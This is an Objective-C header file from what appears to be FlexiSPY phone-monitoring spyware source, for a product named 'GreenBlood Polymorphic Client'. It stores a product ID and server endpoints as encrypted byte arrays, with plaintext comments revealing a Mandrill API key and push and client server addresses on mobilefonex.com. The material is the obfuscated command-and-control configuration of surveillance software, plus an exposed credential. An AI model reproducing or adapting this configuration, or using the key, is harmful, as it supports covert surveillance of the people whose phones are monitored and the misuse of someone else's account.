////
//  Product.h
//  FlexiSPY
//
//  Created by Makara Khloth on 6/8/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//
#if TARGET_OS_IPHONE
    #import <UIKit/UIKit.h>
#endif

//====================================================================================================================
/*
 Product Id			: ​5007
 Protocol Language	: 1
 Protocol Version	: 11
 Product Version	: x.x.x
 Product Name		: GreenBlood
 Product Description: GreenBlood Polymorphic Client
 Language			: English
 Hash Tail			: UNxS3LEICEUZ06P8n7PZEVUHJjSVuI4E
*/

unsigned char kProductInfoCipher[] = {0xa0,0x7f,0x43,0xfe,0x1d,0x4b,0x11,0x4b,0x7c,0xfd,0x5b,0xad,0xe4,0xf3,0x9c,0xb8,0xe2,0x30,0x16,0x7b,0x19,0xc7,0xf7,0x55,0x67,0xa7,0xf4,0x3,0xbd,0x3,0x7,0xc,0x28,0x8a,0x38,0x47,0x5,0xc6,0x92,0x46,0xd9,0xbf,0x91,0xdc,0xc7,0x64,0x39,0xd0,0xf,0x51,0x86,0xd5,0x77,0x85,0xc4,0x52,0x2a,0x49,0xa4,0x8f,0xee,0x5f,0x18,0x4a,0x70,0x57,0xb8,0x24,0xc0,0xd8,0x2c,0x68,0xe8,0x49,0x45,0xf9,0xc9,0xf2,0x9f,0x7a,0x97,0xc3,0x90,0xa0,0xbd,0xce,0xca,0x59,0xa1,0xa4,0x93,0xba,0x9f,0xbd,0x22,0xbb,0xbc,0x35,0x5,0x12,0x1a,0xe0,0x47,0xe7,0xb7,0x9,0x44,0x9e,0x9b,0xbc,0x4c,0x25,0x1f,0x74,0xa1,0xb,0xc2,0xf1,0xaa,0xe3,0xd4,0xe1,0x3e,0x85,0x4e,0xec,0x11,0x12};

//====================================================================================================================
// [Mandrill key] DYChWrD-hNV5K2QxqqU3DA
unsigned char kMandrillKey[] = {0x64,0x52,0x97,0x30,0x3e,0x5e,0x41,0x10,0xd7,0x9d,0xb4,0xce,0x1f,0xee,0x6d,0x50,0x22,0x10,0xfe,0x5,0x3d,0x5d,0x25,0x57,0xc3,0xed,0xc4,0x78,0x39,0xb5,0x53,0x99};

//====================================================================================================================
// [Push Test, Production, Dev] push.mobilefonex.com
unsigned char kPushServerUrl[] = {0x26,0x97,0xbf,0x8f,0x9f,0x91,0x6f,0x39,0xe4,0xf5,0x9d,0xc7,0x7c,0x58,0xc8,0x81,0x87,0x7c,0x37,0xf0,0xeb,0x1a,0x7f,0x4e,0x1,0x39,0x86,0xda,0x17,0x95,0xc4,0x20};

unsigned int kPushServerPort = 443;

//====================================================================================================================
// [SERVER_URL-Production]  http://client.mobilefonex.com
unsigned char kServerUrl[] = {0x12,0xc2,0x61,0x21,0xc1,0x73,0x6b,0xa6,0x27,0x4d,0x36,0x23,0xd4,0x3a,0x69,0x7b,0x2,0xee,0x10,0x66,0x85,0x77,0x81,0xe9,0x88,0x5e,0x39,0x71,0x7d,0x52,0x80,0x23,0x4b,0x1f,0xc9,0xb1,0xb1,0x7e,0x3a,0x9b,0x81,0x97,0xfe,0xf5,0x26,0xb2,0x24,0xc};

//====================================================================================================================
// [SERVER_URL-Test] http://test-client.mobilefonex.com
//unsigned char kServerUrl[] = {0xb6,0xe6,0x6a,0x37,0x26,0x77,0xec,0xdc,0xca,0x1a,0x39,0x64,0x51,0xe4,0x8,0xb9,0x3,0x51,0xe4,0x4c,0x92,0xff,0x47,0xfd,0x31,0x32,0xaa,0x1e,0xe9,0xd2,0x73,0x50,0x72,0x26,0xd3,0x96,0x3d,0x8d,0xa4,0xd0,0x93,0xe8,0x8f,0x16,0x9f,0x28,0x9d,0x1e};

// [SERVER_URL-Dev] http://dev-client.mobilefonex.com
//unsigned char kServerUrl[] = {0x4c,0x7e,0xac,0x9c,0x44,0x15,0xb,0x4c,0xf,0x4b,0xb8,0xa9,0xc8,0xdf,0x34,0xe5,0x8a,0x7d,0xe6,0xd6,0xa6,0xb5,0x6a,0x3e,0x46,0x7,0xed,0x93,0x5b,0x74,0xfb,0x9,0x2f,0x87,0x2,0xda,0x23,0x78,0x79,0xf5,0x50,0x63,0xc7,0xd7,0x69,0x38,0xc5,0xeb};
